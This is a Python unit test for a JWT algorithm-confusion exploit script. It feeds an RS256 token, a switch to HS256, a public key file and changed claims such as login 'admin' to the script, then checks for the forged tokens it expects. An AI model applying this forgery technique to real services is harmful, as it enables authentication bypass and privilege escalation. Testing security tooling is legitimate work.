#! /usr/bin/env python3

from unittest import mock
from io import StringIO
import unittest

import sys
sys.path.append('../')
import exploit

KEY_USER_INPUT = 'UserInput';
KEY_EXPECTED_JWT = 'ExpectedJWT';

DATA_PROVIDER = [
    {
        KEY_USER_INPUT: [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InVzZXIifQ.RKVu9UEbdAaEi8EVph4c9lDZjLtkxDKts57kdaqZwd76GtRaT2tuxJBkid8wyofh-u23zgasO1ei1_beMBufseH5XE6P8nCk-IDsjiTOthF2DPOEoiNlf30HmWEcRdnxAjCTfRWAWoALBfNFutVbO0PP9vRmu9tNDrExd8x5erP-QnDfdEIQIi763FiLqwP5nVqKjlBZkNuEdiZxyCkgcLg-WZtQkGlf6G78n4U8T6qGnHXxRZxuuMcEEYnbf5iHPNKqys-t4hvc1h3vAWH_qxPSuzRKg_mucmY7jEYCnIK5MU_jCg12-LPYOk91e8_HjY4bvJmpm2lSQvHqQdJoYw',
            'ascii',
            'alg',
            'HS256',
            'login',
            'admin',
            'public.pem',
        ],
        KEY_EXPECTED_JWT: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.FSfvCBAwypJ4abF6jFLmR7JgZhkW674Z8dIdAIRyt1E',
    },
    {
        KEY_USER_INPUT: [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJSU0EifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
            'utf8',
            'alg',
            'HS256',
            'sub',
            '999',
            'public.pem',
        ],
        KEY_EXPECTED_JWT: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5OTkiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJ9.0oGhoIieGAjG35E2-wZPEPixL1-ZsQ2B_bmrfsFxmKI',
    },
]

class TestTheExploit(unittest.TestCase):


    
    @mock.patch('sys.stdout', new_callable = StringIO)

    def test_exploit_run(self, mock_stdout):
        for testData in DATA_PROVIDER:
            
            with mock.patch('builtins.input', side_effect = testData[KEY_USER_INPUT]):
                exploit.run()

            result = mock_stdout.getvalue()
            assert testData[KEY_EXPECTED_JWT] in result, 'The result does not contain the expected JWT'

